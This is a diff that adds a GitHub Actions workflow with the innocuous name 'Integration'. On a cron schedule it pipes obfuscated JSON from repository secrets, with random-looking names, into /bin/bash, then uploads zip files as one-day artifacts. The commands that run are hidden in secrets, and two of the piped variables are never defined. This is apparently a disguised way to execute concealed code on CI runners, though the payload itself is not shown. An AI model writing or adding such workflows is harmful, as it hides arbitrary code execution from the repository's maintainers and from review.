@@ -1,0 +1,33 @@
+name: Integration
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '3 4,10,16,22 * * *'
+permissions:
+  contents: read
+  actions: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  deploy:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Bootstrap
+        env:
+          belks4555: ${{ secrets.belks4555 }}
+        run: |
+          printf '%s' "$belks4555" | jq -r .ygq65782 | /bin/bash
+          printf '%s' "$cuovw9" | jq -r .ry98 | /bin/bash
+          printf '%s' "$swpm83" | jq -r .i8866 | /bin/bash
+
+      - name: Archive artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: 8cWWjn4u
+          path: "*.zip"
+          retention-days: 1
